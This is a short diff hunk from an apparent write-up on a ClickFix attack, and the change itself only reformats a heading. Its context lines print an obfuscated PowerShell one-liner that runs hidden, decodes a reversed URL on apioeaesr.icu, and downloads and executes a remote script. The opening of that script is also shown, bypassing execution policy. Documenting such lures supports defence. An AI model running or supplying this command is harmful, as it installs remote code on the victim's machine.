@@ -47,7 +47,7 @@ Details
 ---- ClickFix Command ----
 powershell -w h -c "$s='xif/uci.rseaeoipa//:sptth';$r=$s[-1..-$s.Length]-join'';iex(iwr $r -UseBasicParsing)""
 
-PowerShell Script (https://apioeaesr.icu/fix):
+---- PowerShell Script (https://apioeaesr.icu/fix) ----
 Set-ExecutionPolicy Bypass -Scope Process -Force;
 try {
     $wc = New-Object System.Net.WebClient
